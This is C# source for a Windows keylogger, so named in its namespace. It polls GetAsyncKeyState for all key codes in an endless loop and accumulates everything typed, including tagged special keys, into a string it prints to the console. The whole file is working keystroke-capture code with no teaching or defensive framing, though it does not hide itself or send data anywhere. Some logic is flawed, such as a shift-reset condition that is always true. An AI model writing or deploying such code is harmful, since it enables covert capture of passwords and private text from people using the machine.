using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Keylogger
{
    static class Program
    {

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static void Main(string[] args)
        {
            bool isShift = false;
            bool isCapital = false;
            string text = "";

            while (true)
            {
                Thread.Sleep(100);
                
                for (int keyCode = 0; keyCode < 255; keyCode++)
                {
                    int keyState = GetAsyncKeyState(keyCode);

                    if (keyState != 0)
                    {
                        String keyString = "";

                        // If shift pressed
                        if ( 
                            (((Keys)keyCode) == Keys.ShiftKey) ||
                            (((Keys)keyCode) == Keys.LShiftKey) ||
                            (((Keys)keyCode) == Keys.RShiftKey)
                        ) { 
                            isShift = !isShift; 
                        }
                        // If capital pressed
                        else  if (((Keys)keyCode) == Keys.Capital)
                        {
                            isCapital = !isCapital;
                        }

                        // if letters pressed 
                        if (
                                (!isShift && !isCapital) &&
                                (keyCode >= 65 && keyCode <= 90)
                            ) 
                        {
                           keyString = ((Keys)keyCode).ToString().ToLower(); // Convert from ASCII to STRING        
                        } 
                        else
                        {
                            // Replace caracters
                            if (((Keys)keyCode) == Keys.Space) { keyString = " "; }
                            else if (((Keys)keyCode) == Keys.Enter) { keyString = "\n"; }
                            else if (((Keys)keyCode) == Keys.Tab) { keyString = "\t"; }

                            else if (((Keys)keyCode) == Keys.Back) { keyString = "<BACK>"; }
                            else if (((Keys)keyCode) == Keys.Delete) { keyString = "<DELETE>"; }

                            // Arrows
                            else if (((Keys)keyCode) == Keys.Left) { keyString = "<LEFT>"; }
                            else if (((Keys)keyCode) == Keys.Right) { keyString = "<RIGHT>"; }
                            else if (((Keys)keyCode) == Keys.Up) { keyString = "<UP>"; }
                            else if (((Keys)keyCode) == Keys.Down) { keyString = "<DOWN>"; }

                            else if (keyCode >= 112 && keyCode <= 123)
                            {
                                keyString = "<" + ((Keys)keyCode).ToString() + ">";
                            }
                            else if (keyCode >= 96 && keyCode <= 105)
                            {
                                keyString = ((Keys)keyCode).ToString().Substring(6);
                            }

                            // Ignore the mouse buttons
                            else if ((((Keys)keyCode) == Keys.LButton) || (((Keys)keyCode) == Keys.RButton)) { keyString = ""; } 
                            else
                            {
                                keyString = ((Keys)keyCode).ToString(); // Convert from ASCII to STRING
                            }
                            
                        }

                        text = text + keyString;
                        Console.WriteLine(text);

                        if (
                            (isShift) &&
                            (
                                (((Keys)keyCode) != Keys.ShiftKey) ||
                                (((Keys)keyCode) != Keys.LShiftKey) ||
                                (((Keys)keyCode) != Keys.RShiftKey)
                            )
                        ) {
                            isShift = false;
                        }
                        
                    }
                }
            }

        }

    }
}
